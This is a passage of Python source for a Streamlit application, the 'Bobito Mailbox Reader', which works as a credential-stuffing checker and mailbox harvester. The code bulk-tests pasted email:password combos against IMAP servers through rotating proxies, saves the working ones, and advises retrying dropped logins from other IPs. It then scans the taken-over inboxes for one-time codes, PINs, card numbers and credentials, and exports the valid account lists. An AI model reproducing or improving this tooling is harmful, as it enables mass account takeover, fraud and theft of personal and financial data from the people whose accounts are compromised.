        debit_sources.append(f"Online Purchase Debit: {online_debits[0].strip()}")

    card_debits = re.findall(r'(?i)(?:card ending in|card ending|debit card charged|charged to card)\s*[:=]?\s*([^\n\r,.]+)', text)
    if card_debits:
        debit_sources.append(f"Card Debit Source: {card_debits[0].strip()}")

    orders = re.findall(r'(?i)(?:order confirmation|purchase order|order #|order number|po #)\s*[:=]?\s*([A-Za-z0-9\-]+)', text)
    if orders:
        debit_sources.append(f"Order/PO Ref: {orders[0].strip()}")

    trackings = re.findall(r'(?i)(?:tracking number|tracking #|track your package|tracking id|shipment tracking)\s*[:=]?\s*([A-Za-z0-9\-]+)', text)
    if trackings:
        debit_sources.append(f"Tracking #: {trackings[0].strip()}")

    formatted_cards.extend(debit_sources)

    return list(dict.fromkeys(formatted_cards)), list(dict.fromkeys(cred_patterns))

def clean_boilerplate(text):
    if not text:
        return ""
    patterns = [
        (r"unsubscribe.*?(?:\n|$)", re.IGNORECASE),
        (r"privacy policy.*?(?:\n|$)", re.IGNORECASE),
        (r"confidentiality notice.*?(?:\n\n|$)", re.IGNORECASE),
        (r"this email was sent by.*?(?:\n|$)", re.IGNORECASE)
    ]
    cleaned = text
    for pat, flags in patterns:
        cleaned = re.sub(pat, "", cleaned, flags=flags)
    return cleaned.strip()

def should_blacklist_message(msg, blacklist_input) -> bool:
    if not blacklist_input:
        return False
    blackwords = [w.strip().lower() for w in blacklist_input.split(",") if w.strip()]
    if not blackwords:
        return False
    combined_text = f"{msg.get('subject', '')} {msg.get('body', '')} {msg.get('from', '')}".lower()
    for bw in blackwords:
        if bw in combined_text:
            return True
    return False
# @@END 025


# @@BLOCK 026 SEARCH_AND_FETCH deps=025
def execute_imap_search_safely(mail, field_cmd: str, query_term: str, log_func):
    clean_q = query_term.replace('"', '\\"')
    f_cmd = field_cmd.upper()

    for strat_name, search_params in [
        ("Native Raw Unquoted", f'{f_cmd} {clean_q}'),
        ("Native Raw Quoted", f'{f_cmd} "{clean_q}"'),
        ("CHARSET UTF-8 Raw", f'CHARSET UTF-8 {f_cmd} "{clean_q}"'),
    ]:
        log_func(f"  ├─ [SEARCH STRATEGY] Trying: mail.search(None, {repr(search_params)})")
        try:
            typ, data = mail.search(None, search_params)
            if typ == "OK" and data:
                log_func(f"  │   └─ ✅ {strat_name} Successful! Response: {data}")
                return typ, data
        except Exception as ex:
            log_func(f"  │   └─ ⚠️ {strat_name} Failed: {ex}")

    log_func(f"  ├─ [SEARCH STRATEGY 4 - BATCHED SCAN ({f_cmd})] Server native search rejected. Running chunked scan...")
    try:
        typ, data = mail.search(None, "ALL")
        if typ == "OK" and data and data[0]:
            all_ids = (data[0] or b"").split()
            if not all_ids:
                return "OK_FALLBACK", [b""]

            log_func(f"  │   └─ 🔍 Batch scanning {len(all_ids)} messages for query '{query_term}' in field '{f_cmd}'...")
            matched_ids = []
            q_lower = query_term.lower()

            if f_cmd == "SUBJECT":
                fetch_query = "(BODY.PEEK[HEADER.FIELDS (SUBJECT)])"
            elif f_cmd == "FROM":
                fetch_query = "(BODY.PEEK[HEADER.FIELDS (FROM)])"
            elif f_cmd == "BODY":
                fetch_query = "(BODY.PEEK[TEXT])"
            else:
                fetch_query = "(BODY.PEEK[])"

            chunk_size = 100
            for i in range(0, len(all_ids), chunk_size):
                chunk_ids = all_ids[i:i + chunk_size]
                id_range_bytes = b",".join(chunk_ids)

                try:
                    _, fetch_datas = mail.fetch(id_range_bytes, fetch_query)
                    if fetch_datas:
                        for item in fetch_datas:
                            if isinstance(item, tuple) and len(item) >= 2:
                                header_str = item[0].decode("utf-8", errors="ignore")
                                content_bytes = item[1].decode("utf-8", errors="ignore")
                                if q_lower in content_bytes.lower():
                                    mid_match = re.search(r'^(\d+)', header_str.strip())
                                    if mid_match:
                                        matched_ids.append(mid_match.group(1).encode('utf-8'))
                except Exception as chunk_ex:
                    log_func(f"  │   └─ ⚠️ Chunk fetch exception: {chunk_ex}")
                    continue

            log_func(f"  │   └─ ✅ Batched Scan Complete! Found {len(matched_ids)} matching message IDs out of {len(all_ids)}.")
            return "OK_FALLBACK", [b" ".join(matched_ids)] if matched_ids else [b""]
    except Exception as ex4:
        log_func(f"  │   └─ ❌ Batched Scan Exception: {ex4}")

    return "NO", [b""]

def fetch_messages_paginated(mail, email_addr, password_val, host_val, target_folders: List[str],
                            search_query: str = "", search_field: str = "TEXT", mode: str = "SEARCH",
                            page_size: int = 15, page_number: int = 1, sort_order: str = "Newest First",
                            log_target: str = "DEBUG"):
    if log_target == "SEARCH":
        st.session_state.search_diag_logs = []
        log_func = search_log
    elif log_target == "OTP":
        st.session_state.otp_diag_logs = []
        log_func = otp_log
    else:
        log_func = debug_log

    messages = []
    start_time = time.time()

    clean_query = search_query.strip()
    log_func(f"⚙️ [ENGINE INIT] Mode: '{mode}' | Target Folders ({len(target_folders)}): {target_folders}")
    log_func(f"🔎 [SEARCH SPECS] Query: '{clean_query}' | Search Field: '{search_field}' | Page: {page_number} | Page Size: {page_size}")

    total_matched_all_folders = 0

    for f_label in target_folders:
        real_imap_folder = get_imap_path(f_label)
        real_imap_encoded = encode_imap_utf7(real_imap_folder)
        log_func(f"\n📂 [PROCESSING FOLDER] Label='{f_label}' -> IMAP Path='{real_imap_folder}' (Encoded: '{real_imap_encoded}')")

        try:
            sel_typ, sel_data = mail.select(f'"{real_imap_encoded}"', readonly=True)
            log_func(f"  ├─ [IMAP SELECT] Status: '{sel_typ}' | Response: {sel_data}")

            if sel_typ != "OK":
                log_func(f"  └─ ⚠️ Skipped folder '{f_label}': Failed to select IMAP path.")
                continue

            if mode == "FOLDER_ONLY" or not clean_query:
                log_func("  ├─ [EXECUTING COMMAND] mail.search(None, 'ALL')")
                typ, data = mail.search(None, "ALL")
            else:
                field_cmd = search_field if search_field in ("TEXT", "SUBJECT", "FROM", "BODY") else "TEXT"
                terms = clean_query.split()

                if len(terms) > 1:
                    log_func(f"  ├─ [MULTI-TERM SEARCH] Query has {len(terms)} keywords. Executing individual IMAP fetches...")
                    matched_ids_set = set()
                    for t_idx, term in enumerate(terms[:10], 1):
                        log_func(f"  │   ├─ [Term #{t_idx}/10]: '{term}'")
                        sub_typ, sub_data = execute_imap_search_safely(mail, field_cmd, term, log_func)
                        if sub_typ in ("OK", "OK_FALLBACK") and sub_data and sub_data[0]:
                            found_ids = (sub_data[0] or b"").split()
                            matched_ids_set.update(found_ids)
                            log_func(f"  │   └─ Matches for '{term}': {len(found_ids)} IDs")
                    typ = "OK"
                    data = [b" ".join(sorted(matched_ids_set, key=lambda x: int(x)))]
                else:
                    log_func(f"  ├─ [SINGLE-TERM SEARCH] Querying term: '{clean_query}' via field '{field_cmd}'")
                    typ, data = execute_imap_search_safely(mail, field_cmd, clean_query, log_func)

            log_func(f"  ├─ [IMAP SEARCH RESPONSE] Status: '{typ}' | Raw Bytes: {data}")
            ids = (data[0] or b"").split() if typ in ("OK", "OK_FALLBACK") and data else []

            if sort_order == "Newest First":
                ids = list(reversed(ids))

            folder_total_count = len(ids)

            start_idx = (page_number - 1) * page_size
            end_idx = start_idx + page_size
            target_ids = ids[start_idx:end_idx]

            log_func(f"  ├─ [PAGINATION RANGE] Total Matched IDs: {folder_total_count} | Processing Batch Range ({start_idx}:{end_idx}): {len(target_ids)} target IDs")

            folder_matches_count = 0

            for idx, mid in enumerate(target_ids, 1):
                msg_start = time.time()

                typ, msgdata = mail.fetch(mid, "(FLAGS ENVELOPE BODYSTRUCTURE BODY.PEEK[])")

                if not msgdata or not isinstance(msgdata[0], tuple):
                    log_func(f"  │   ├─ [Msg ID #{mid.decode()}] ⚠️ FETCH returned empty structure.")
                    continue

                raw_msg_bytes = msgdata[0][1]
                msg = message_from_bytes(raw_msg_bytes)
                subject = decode_hdr(msg.get("Subject", ""))
                frm = decode_hdr(msg.get("From", ""))
                to_hdr = decode_hdr(msg.get("To", ""))
                date_val = decode_hdr(msg.get("Date", ""))
                flags_str = str(msgdata[0][0])
                is_read = "\\Seen" in flags_str

                body_text = ""
                if msg.is_multipart():
                    for part in msg.walk():
                        if part.get_content_type() == "text/plain":
                            try:
                                body_text = part.get_payload(decode=True).decode("utf-8", errors="ignore")
                                break
                            except Exception:
                                pass
                else:
                    try:
                        body_text = msg.get_payload(decode=True).decode("utf-8", errors="ignore")
                    except Exception:
                        pass

                if is_extortion_spam(subject, body_text, frm):
                    log_func(f"  │   ├─ [Msg ID #{mid.decode()}] ⚠️ EXCLUDED: Extortion / Ransom Spam detected.")
                    continue

                cleaned_body = clean_boilerplate(body_text)
                pins, links = extract_pins_and_links(body_text)
                cards, creds = extract_credentials_and_cards(body_text)
                detected_categories = detect_specific_categories(subject, body_text, frm, pins, cards, creds)
                is_bot = len(detected_categories) > 0

                folder_matches_count += 1
                messages.append({
                    "id": mid.decode(),
                    "folder": f_label,
                    "from": frm,
                    "to": to_hdr,
                    "subject": subject,
                    "date": date_val,
                    "is_read": is_read,
                    "is_bot": is_bot,
                    "categories": detected_categories,
                    "body": cleaned_body,
                    "pins": pins,
                    "links": links,
                    "cards": cards,
                    "creds": creds,
                    "raw": raw_msg_bytes,
                    "flags": flags_str,
                    "size_bytes": len(raw_msg_bytes)
                })

                fetch_elapsed = round((time.time() - msg_start) * 1000, 2)
                log_func(
                    f"  │   ├─ [Msg #{idx} | ID: {mid.decode()}] Parsed in {fetch_elapsed}ms | Size: {len(raw_msg_bytes)}B | "
                    f"From: '{frm}' | To: '{to_hdr}' | Subject: '{subject}' | "
                    f"Flags: {flags_str} | Categories={detected_categories} | Pins={pins} | Cards={cards}"
                )

            total_matched_all_folders += folder_total_count
            log_func(f"  ├─ [MATCHES COUNT] Verified {folder_matches_count} matching messages in '{f_label}'.")

        except (socket.timeout, TimeoutError):
            log_func(f"  └─ ❌ [TIMEOUT ERROR] Folder '{f_label}' timed out during IMAP search.")
        except MsVerdict as mv:                                     # v13.37
            log_func(f"  └─ ❌ [MICROSOFT VERDICT] {mv.verdict}: {mv.detail}")
            raise
        except Exception as ex:
            log_func(f"  └─ ❌ [EXCEPTION ERROR] Querying folder '{f_label}' failed: {ex}")

    total_elapsed = round(time.time() - start_time, 2)
    if log_target == "SEARCH":
        st.session_state.search_total_matched_count = total_matched_all_folders
    elif log_target == "OTP":
        st.session_state.otp_total_matched_count = total_matched_all_folders
    else:
        st.session_state.total_matched_count = total_matched_all_folders

    save_session_cache()
    log_func(f"\n🏁 [ENGINE COMPLETE] Total retrieved page messages: {len(messages)} / {total_matched_all_folders} matched | Execution time: {total_elapsed}s")
    return messages
# @@END 026


# @@BLOCK 027 HERO_AND_VALID deps=026
# Header (theme-synced from app.py's Theme Studio)
hero(
    "🚀📥 Bobito Mailbox Reader & Portal Hub Advanced IMAP Client",
    "Interactive Bot Intelligence, Dedicated OTP/Debit Card & Credentials Scanner, "
    "Multi-Field Search, Telegram/Blacklist Filter, Deep Diagnostic Instrumentation.",
    tags=["OTP Scanner", "Card / Debit", "Telegram Filter", "Bot Purge", "Deep Search", "Microsoft XOAUTH2"],
)

st.caption(
    f"Advanced IMAP Client with Interactive Bot Intelligence, Dedicated OTP, Debit/Credit Card & "
    f"Credentials Scanner, Multi-Field Search, Telegram/Blacklist Filter, and Deep Diagnostic Instrumentation. "
    f"— Theme in use: **{THEME.get('preset', DEFAULT_PRESET)}** (synced from the checker)"
)

valid = load_valid()
# @@END 027


# @@BLOCK 028 DELETION_MANAGER deps=027
# --- Account Deletion Manager ---
with st.expander("🗑️ Account Deletion Manager", expanded=False):
    st.markdown("#### Permanent Account Deletion Options")
    clean_valid_accounts_list = [l for l in valid if not l.startswith("# Found:")]

    if clean_valid_accounts_list:
        del_action_mode = st.selectbox(
            "Select Deletion Mode",
            ["-- Choose Action --", "Delete Selected Valid Account(s)", "Delete ALL Valid Accounts"],
            key="del_action_mode_sel"
        )

        if del_action_mode == "Delete Selected Valid Account(s)":
            if "select_all_accounts_chk" not in st.session_state:
                st.session_state.select_all_accounts_chk = False

            def toggle_select_all():
                if st.session_state.select_all_accounts_chk:
                    st.session_state.accounts_to_del_multiselect = clean_valid_accounts_list
                else:
                    st.session_state.accounts_to_del_multiselect = []

            col_sel1, col_sel2 = st.columns([3, 1])
            with col_sel2:
                st.markdown("<br>", unsafe_allow_html=True)
                st.checkbox("Select All", key="select_all_accounts_chk", on_change=toggle_select_all)

            with col_sel1:
                selected_accounts_to_delete = st.multiselect(
                    "Select Account(s) to Permanently Delete",
                    clean_valid_accounts_list,
                    key="accounts_to_del_multiselect"
                )

            if selected_accounts_to_delete:
                if st.button("🗑️ Permanently Delete Selected Account(s)", type="primary", use_container_width=True):
                    for acc in selected_accounts_to_delete:
                        delete_specific_account_from_storage(acc)
                    st.success(f"Permanently deleted {len(selected_accounts_to_delete)} account(s)!")
                    save_session_cache()
                    st.rerun()

        elif del_action_mode == "Delete ALL Valid Accounts":
            st.warning("⚠️ Warning: This will permanently remove all stored valid accounts from local record files!")
            confirm_all = st.checkbox("I confirm I want to delete ALL valid accounts permanently", key="confirm_del_all_checkbox")
            if confirm_all:
                if st.button("🚨 Permanently Delete ALL Accounts", type="primary", use_container_width=True):
                    clear_all_valid_accounts_storage()
                    st.success("Permanently deleted all valid accounts!")
                    save_session_cache()
                    st.rerun()
    else:
        st.caption("No valid accounts currently available for deletion.")
# @@END 028


# @@BLOCK 029 ACCOUNT_PICKER deps=028
# --- Keyboard Search & Filter Box ---
account_filter_query = st.text_input("🔍 Filter Valid Accounts (Type to search with keyboard)", placeholder="Type email, domain, or timestamp...").strip().lower()

if account_filter_query:
    filtered_options = []
    i = 0
    while i < len(valid):
        item = valid[i]
        if item.startswith("# Found:"):
            if i + 1 < len(valid) and account_filter_query in valid[i+1].lower():
                filtered_options.append(item)
                filtered_options.append(valid[i+1])
            i += 2
        else:
            if account_filter_query in item.lower():
                filtered_options.append(item)
            i += 1
    valid_dropdown_options = filtered_options if filtered_options else ["none"]
else:
    valid_dropdown_options = valid if valid else ["none"]

# Preselect: forced_account wins, else last used. The widget itself owns the
# key afterwards, so we seed/repair the key BEFORE the widget is created.
default_index = 0
if st.session_state.get("forced_account") in valid_dropdown_options:
    default_index = valid_dropdown_options.index(st.session_state["forced_account"])
else:
    last_acc = load_last_account()
    if last_acc in valid_dropdown_options:
        default_index = valid_dropdown_options.index(last_acc)

if st.session_state.get("selected_account") not in valid_dropdown_options:
    st.session_state["selected_account"] = (
        valid_dropdown_options[default_index] if valid_dropdown_options else "none"
    )

pick = st.selectbox("Valid account", valid_dropdown_options, key="selected_account")

actual_pick = "none"
if pick and pick != "none":
    if pick.startswith("# Found:"):
        st.warning("Please select the email:password combo below the timestamp (timestamps are non-clickable labels).")
        actual_pick = "none"
    else:
        actual_pick = pick.strip()

if actual_pick and actual_pick != "none" and ":" in actual_pick:
    save_last_account(actual_pick)
    save_session_cache()
# @@END 029


# @@BLOCK 030 SIDEBAR_HUB deps=029
st.sidebar.header("Account & Connection Hub")

st.sidebar.checkbox(
    "🌐 Route mailbox connections through proxy",
    key="reader_use_proxy",
    help="Off (default) connects directly. On routes IMAP through the first proxy from proxies.txt. "
         "v13.37: the node is PROBED against the target host first and rotated on failure."
)

if valid:
    clean_download_lines = [line for line in valid if not line.startswith("# Found:")]
    valid_text_data = "\n".join(clean_download_lines)
    st.sidebar.download_button(
        label="📥 Download Valid Mail List",
        data=valid_text_data,
        file_name=f"valid_accounts_{len(clean_download_lines)}.txt",
        mime="text/plain",
        use_container_width=True
    )

    zip_bytes = generate_all_mail_zip()
    st.sidebar.download_button(
        label="📦 Download All Mail Lists (ZIP)",
        data=zip_bytes,
        file_name="all_mail_results_bundle.zip",
        mime="application/zip",
        use_container_width=True
    )
# @@END 030


# @@BLOCK 031 SIDEBAR_CONFIG deps=029
# App Configuration Settings Drawer
with st.sidebar.expander("⚙️ App Configuration Settings", expanded=False):
    cfg = st.session_state.app_config

    new_timeout = st.number_input("Connection Timeout (seconds)", min_value=5, max_value=300, value=cfg.get("connection_timeout", 15))
    new_port = st.number_input("Default IMAP Port", min_value=1, max_value=65535, value=cfg.get("imap_port", 993))
    new_fallback = st.checkbox("Enable Auto-Fallback Host Probing (Spectrum/Charter/TWC)", value=cfg.get("auto_fallback_probing", True))
    new_starttls = st.checkbox("Try STARTTLS / plaintext on port 143 if 993 fails", value=cfg.get("try_starttls", True))
    new_altuser = st.checkbox("Try local-part username on auth failure", value=cfg.get("try_alt_username", True))
    # v13.39: allow_self_signed existed in app_config.json and was read by nothing.
    new_selfsigned = st.checkbox(
        "Allow self-signed / expired certificates",
        value=cfg.get("allow_self_signed", True),
        help="Untick to require a valid, hostname-matching certificate. This setting was in the "
             "config file but the page hardcoded verify=False in both the implicit and STARTTLS rung, "
             "so it could never take effect."
    )

    if st.button("💾 Save App Settings", type="secondary", use_container_width=True):
        st.session_state.app_config["connection_timeout"] = new_timeout
        st.session_state.app_config["imap_port"] = new_port
        st.session_state.app_config["auto_fallback_probing"] = new_fallback
        st.session_state.app_config["try_starttls"] = new_starttls
        st.session_state.app_config["try_alt_username"] = new_altuser
        st.session_state.app_config["allow_self_signed"] = new_selfsigned
        save_app_config(st.session_state.app_config)
        st.success("App configuration updated and saved globally!")
# @@END 031


# @@BLOCK 032 SIDEBAR_BATCH deps=031
# Batch Account Importer & Validator Bar
st.sidebar.markdown("---")
st.sidebar.subheader("📋 Batch Account Importer & Validator")
batch_paste_input = st.sidebar.text_area(
    "Paste Multiple Accounts (email:pass)",
    key="batch_paste_text",
    placeholder="user1@charter.net:pass1\nuser2@spectrum.net:pass2",
    height=110
)
batch_host_override_input = st.sidebar.text_area(
    "Batch IMAP Host Overrides (comma, semicolon or newline separated)",
    key="batch_host_ov",
    placeholder="mobile.charter.net\nimap.spectrum.net",
    height=80
)

if st.sidebar.button("🚀 Validate & Import Batch Accounts", type="primary", use_container_width=True):
    lines = [l.strip() for l in batch_paste_input.splitlines() if l.strip() and not l.strip().startswith("#")]
    if not lines:
        st.sidebar.error("Please paste at least one account in email:password format.")
    else:
        batch_logs = []
        table_rows = []
        valid_count = 0
        wrong_count = 0
        appass_count = 0
        login_drop_count = 0                       # v13.39
        failed_count = 0

        progress_bar = st.sidebar.progress(0)
        status_display = st.sidebar.empty()

        start_run_time = datetime.now()
        start_time_str = start_run_time.strftime("%Y-%m-%d %H:%M:%S")
        timestamp_str = f"# Started:{start_time_str}"
        new_valid_entries = [timestamp_str]

        cfg_timeout = st.session_state.app_config.get("connection_timeout", 15)
        cfg_port = st.session_state.app_config.get("imap_port", 993)
        cfg_alt_user = st.session_state.app_config.get("try_alt_username", True)

        user_host_overrides = [h.strip() for h in re.split(r'[,;\n]+', batch_host_override_input) if h.strip()]
        active_proxy_pool = load_app_proxies() or [{"proxy": None, "country": "Direct", "region": "-"}]

        for idx, line in enumerate(lines):
            clean_line = line.split("|")[0].strip()
            row_time = datetime.now().strftime("%H:%M:%S")
            proxy_item = active_proxy_pool[idx % len(active_proxy_pool)]

            if ":" not in clean_line:
                failed_count += 1
                batch_logs.append(f"❌ [{row_time}] [SKIPPED] Invalid format: {line}")
                table_rows.append({
                    "Time": row_time,
                    "Status": "FAILED",
                    "Email:Password": line,
                    "Under-The-Hood Background Trace": f"Proxy: {proxy_item['proxy']} | Country: {proxy_item['country']} | Region: {proxy_item['region']} | Result: Invalid format (missing colon delimiter)"
                })
                continue

            email_val, pass_val = clean_line.split(":", 1)
            email_val = email_val.strip()
            pass_val = pass_val.strip()

            status_display.text(f"Testing ({idx+1}/{len(lines)}): {email_val} via {proxy_item['proxy']}")
            progress_bar.progress((idx + 1) / len(lines))

            domain_lower = email_val.split("@")[-1].lower() if "@" in email_val else ""

            if user_host_overrides:
                hosts_to_test = list(user_host_overrides)
                for h in candidate_hosts(email_val):
                    if h not in hosts_to_test:
                        hosts_to_test.append(h)
            else:
                hosts_to_test = candidate_hosts(email_val)

            # Zero-access guard: never let the loop be a no-op
            if not hosts_to_test:
                hosts_to_test = [f"imap.{domain_lower}", f"mail.{domain_lower}", domain_lower]

            is_success = False
            status_type = "FAILED"
            connected_h = ""
            err_msg = ""
            auth_err = ""
            ms_verdict = None                              # v13.37
            trace_steps = []

            users_to_try = username_candidates(email_val) if cfg_alt_user else [email_val]

            for h in hosts_to_test:
                test_m = None
                try:
                    trace_steps.append(f"Attempting IMAP TLS -> Host: {h}:{cfg_port} (STARTTLS/plain fallback enabled)")
                    test_m = connect_and_login(h, cfg_port, cfg_timeout,
                                               proxy_item.get("proxy"),
                                               users_to_try, pass_val, email_val)
                    trace_steps.append(f"Authenticated as '{email_val}'")
                    test_m.logout()
                    connected_h = h
                    is_success = True
                    status_type = "VALID"
                    trace_steps.append(f"Successfully authenticated against {h}:{cfg_port}")
                    break
                except MsVerdict as mv:                    # v13.37: definitive
                    ms_verdict = mv
                    err_msg = mv.detail
                    trace_steps.append(f"Microsoft verdict {mv.verdict}: {mv.detail}")
                    if test_m:
                        try:
                            test_m.logout()
                        except Exception:
                            pass
                    break
                except Exception as ex:
                    err_msg = str(ex)
                    if not auth_err and _looks_like_auth_error(err_msg):
                        auth_err = err_msg
                    trace_steps.append(f"Failed {h}: {err_msg}")
                    if test_m:
                        try:
                            test_m.logout()
                        except Exception:
                            pass

            full_trace = f"Proxy: {proxy_item['proxy']} | Country: {proxy_item['country']} | Region: {proxy_item['region']} | Host: {connected_h or hosts_to_test[0]} | Port: {cfg_port} | Steps Executed: " + " | ".join(trace_steps)

            if is_success:
                valid_count += 1
                found_timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                combo_str = f"{email_val}:{pass_val}"
                new_valid_entries.append(f"{combo_str} | Found: {found_timestamp}")
                batch_logs.append(f"✅ [{row_time}] [VALID] {email_val} via {connected_h} [Proxy: {proxy_item['proxy']} ({proxy_item['country']}, {proxy_item['region']})]")
            elif ms_verdict is not None:                   # v13.37
                if ms_verdict.verdict == "WRONG":
                    wrong_count += 1
                    status_type = "WRONG"
                else:
                    appass_count += 1
                    status_type = "APPASS"
                batch_logs.append(f"{'❌' if status_type == 'WRONG' else '🔑'} [{row_time}] [{status_type}] {email_val} — {ms_verdict.detail}")
            else:
                # App-password wins over auth, network errors never count as WRONG
                classify_src = auth_err or err_msg
                if domain_lower in ZERO_ACCESS_PROVIDERS:
                    appass_count += 1
                    status_type = "APPASS"
                    batch_logs.append(f"🔑 [{row_time}] [APPASS] {email_val} — provider has no standard IMAP (needs app password / bridge)")
                elif _looks_like_app_password_error(classify_src):
                    appass_count += 1
                    status_type = "APPASS"
                    batch_logs.append(f"🔑 [{row_time}] [APPASS] {email_val} — {classify_src}")
                elif _looks_like_auth_error(classify_src) and not _looks_like_network_error(classify_src):
                    wrong_count += 1
                    status_type = "WRONG"
                    batch_logs.append(f"❌ [{row_time}] [WRONG] {email_val} — {classify_src}")
                elif _looks_like_login_drop(classify_src):        # v13.39
                    login_drop_count += 1
                    failed_count += 1
                    status_type = "LOGIN_DROPPED"
                    batch_logs.append(
                        f"🚪 [{row_time}] [LOGIN_DROPPED] {email_val} — server answered then closed "
                        f"the socket (* BYE); the password is still UNTESTED — {classify_src}")
                else:
                    failed_count += 1
                    status_type = "FAILED"
                    batch_logs.append(f"⚠️ [{row_time}] [FAILED] {email_val} — {err_msg}")

            table_rows.append({
                "Time": row_time,
                "Status": status_type,
                "Email:Password": f"{email_val}:{pass_val}",
                "Under-The-Hood Background Trace": full_trace
            })

        progress_bar.empty()
        status_display.empty()

        end_run_time = datetime.now()
        duration_delta = end_run_time - start_run_time
        dur_str = str(duration_delta).split(".")[0]
        if len(dur_str) == 5:
            dur_str = f"0:{dur_str}"

        st.session_state.batch_run_meta = {
            "started": start_time_str,
            "ended": end_run_time.strftime("%Y-%m-%d %H:%M:%S"),
            "duration": dur_str
        }

        st.session_state.batch_stats = {
            "valid": valid_count,
            "wrong": wrong_count,
            "appass": appass_count,
            "login_dropped": login_drop_count,          # v13.39
            "failed": failed_count
        }
        st.session_state.batch_results_table = table_rows
        st.session_state.batch_validation_logs = batch_logs

        if valid_count > 0:
            # v13.37: MERGE (deduped by email) instead of blind prepend, so the
            # engine's overwrite and this page's write can no longer fight.
            merge_into_clean_valid(new_valid_entries[1:])

        save_session_cache()
        st.sidebar.success(f"Batch validation complete! Valid: {valid_count}, Invalid/Failed: {failed_count + wrong_count}")
        st.rerun()
# @@END 032


# @@BLOCK 033 STREAM_TABS deps=032
# Live Execution Stream & Analytics Dashboard
st.markdown("---")
tab_stream, tab_analytics = st.tabs(["⚡ Live Execution Stream", "📊 Live Report Log & Analytics"])

with tab_stream:
    if st.session_state.get("batch_validation_logs"):
        st.code("\n".join(st.session_state.batch_validation_logs), language="text")
    else:
        st.caption("No batch validation execution logs recorded yet. Run a batch validation from the sidebar.")

with tab_analytics:
    meta = st.session_state.get("batch_run_meta")
    if meta:
        st.success(f"🎉 Check Complete! Started: {meta['started']} | Ended: {meta['ended']} | Duration: {meta['duration']}")

    stats = st.session_state.batch_stats
    a_col1, a_col2, a_col3, a_col4, a_col5 = st.columns(5)
    with a_col1:
        st.metric("✅ Valid", stats.get("valid", 0))
    with a_col2:
        st.metric("❌ Wrong", stats.get("wrong", 0))
    with a_col3:
        st.metric("🔑 AppPass", stats.get("appass", 0))
    with a_col4:
        st.metric("🚪 Dropped", stats.get("login_dropped", 0))      # v13.39
    with a_col5:
        st.metric("⚠️ Failed", stats.get("failed", 0))

    if stats.get("login_dropped"):
        st.warning(
            f"🚪 **{stats['login_dropped']} account(s) hit a LOGIN DROP** — the server answered, "
            f"accepted the LOGIN command and then closed the socket (* BYE). Those passwords are "
            f"still UNTESTED. Retry them from a different IP, or with an app password, before "
            f"discarding them."
        )

    st.markdown("#### Detailed Execution Log Table")
    if st.session_state.batch_results_table:
        st.dataframe(
            st.session_state.batch_results_table,
            column_order=("Time", "Status", "Email:Password", "Under-The-Hood Background Trace"),
            use_container_width=True,
            hide_index=True
        )
    else:
        st.caption("No table results available yet.")
# @@END 033


# @@BLOCK 034 SIDEBAR_OVERRIDES_LOGIN deps=033
st.sidebar.markdown("---")

st.sidebar.text_input("Email override", key="custom_email")
st.sidebar.text_input("Password override", type="password", key="custom_pass")
st.sidebar.text_input("IMAP host override", key="custom_host")

if st.sidebar.button("🔑 Login & Save Account", type="primary", use_container_width=True):
    c_email = st.session_state.custom_email.strip()
    c_pass = st.session_state.custom_pass.strip()
    c_override = st.session_state.custom_host.strip()
    if not c_email or not c_pass:
        st.sidebar.error("Please enter both Email and Password override.")
    else:
        hosts = candidate_hosts(c_email, override_host=c_override)
        success, connected_host, discovered_folders = False, "", ["INBOX"]
        last_err = ""
        test_mail = None

        with st.spinner("Connecting, authenticating & discovering folders..."):
            for host in hosts:
                try:
                    test_mail = open_mail(c_email, c_pass, host)
                    discovered_folders = list_folders(test_mail, email_addr=c_email, host_val=host)
                    connected_host = host
                    success = True
                    break
                except MsVerdict as mv:                    # v13.37: stop hopping
                    last_err = f"{host}: {mv.detail} [{mv.verdict}]"
                    if test_mail:
                        try:
                            test_mail.logout()
                        except Exception:
                            pass
                    break
                except Exception as ex:
                    last_err = f"{host}: {ex}"
                    if test_mail:
                        try:
                            test_mail.logout()
                        except Exception:
                            pass

        if success:
            combo = f"{c_email}:{c_pass}"

            if st.session_state.active_mail and st.session_state.get("connected_account_combo") != combo:
                try:
                    st.session_state.active_mail.logout()
                except Exception:
                    pass

            st.session_state.active_mail = test_mail
            st.session_state.connected_account_combo = combo

            found_timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            new_entry_line = f"{combo} | Found: {found_timestamp}\n"

            existing_content = ""
            if os.path.exists(MANUAL_VALID_FILE):
                with open(MANUAL_VALID_FILE, "r", encoding="utf-8", errors="ignore") as f:
                    existing_content = f.read()

            with open(MANUAL_VALID_FILE, "w", encoding="utf-8") as f:
                f.write(new_entry_line + existing_content)

            save_last_account(combo)
            st.session_state.forced_account = combo
            st.session_state.mb_host = connected_host
            st.session_state.mb_folders = discovered_folders
            # Push the selection into the dropdown key too, otherwise the
            # selectbox keeps whatever it already had.
            if combo in valid_dropdown_options:
                st.session_state["selected_account"] = combo
            save_session_cache()
            st.sidebar.success(f"Connected: {connected_host} ({len(discovered_folders)} folders)")
            st.rerun()
        else:
            st.sidebar.error(f"❌ Login failed: {last_err}")
# @@END 034


# @@BLOCK 035 REFRESH_AND_PORTAL deps=034
active_email, active_password = "", ""
if actual_pick != "none" and ":" in actual_pick:
    active_email, active_password = actual_pick.split(":", 1)

override = st.session_state.custom_host.strip()

if st.sidebar.button("🔄 Refresh Inbox", type="secondary", use_container_width=True):
    if active_email and active_password:
        host = resolve_active_host(active_email)
        try:
            with st.spinner("Refreshing Inbox..."):
                mail_obj = get_active_mail(active_email, active_password, host)
                st.session_state.current_messages = fetch_messages_paginated(
                    mail_obj, active_email, active_password, host, ["INBOX"], mode="FOLDER_ONLY",
                    page_size=15, page_number=1, sort_order="Newest First", log_target="DEBUG"
                )
                st.session_state.current_page = 1
                st.session_state.bot_filter_mode = False
                save_session_cache()
                st.sidebar.success("Inbox refreshed successfully!")
        except MsVerdict as mv:                            # v13.37
            st.sidebar.error(f"{mv.verdict}: {mv.detail}")
        except Exception as e:
            st.sidebar.error(f"Refresh failed: {e}")

if active_email and active_password:
    st.sidebar.markdown("---")
    st.sidebar.subheader("🌐 Webmail Portal & Credentials")
    portal_url = get_webmail_portal(active_email)
    st.sidebar.markdown(f"[Open Webmail Portal]({portal_url})", unsafe_allow_html=True)
    st.sidebar.text_input("Copy Credentials", value=f"{active_email}:{active_password}")
# @@END 035


# @@BLOCK 036 CONNECT_DISCOVER deps=035
if st.button("Connect & Discover Folders", type="primary", use_container_width=True):
    if actual_pick == "none" or not actual_pick or ":" not in actual_pick:
